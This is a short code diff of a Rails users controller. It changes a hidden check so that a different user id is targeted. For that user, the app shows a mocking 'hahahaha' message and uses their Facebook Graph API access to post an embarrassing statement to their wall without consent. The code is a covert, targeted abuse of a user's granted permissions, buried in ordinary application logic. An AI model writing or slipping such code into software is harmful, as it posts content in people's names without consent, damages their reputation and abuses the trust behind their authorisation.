@@ -20,7 +20,7 @@ class UsersController < ApplicationController
         f.each do |f|
           @friends << User.find_by_uid(f['id'])
         end
-        if(@user.id == 8)
+        if(@user.id == 7)
           flash[:warning] = 'hahahaha'
           graph.put_wall_post("I always get naked before I poop. It just feels free.")
         end
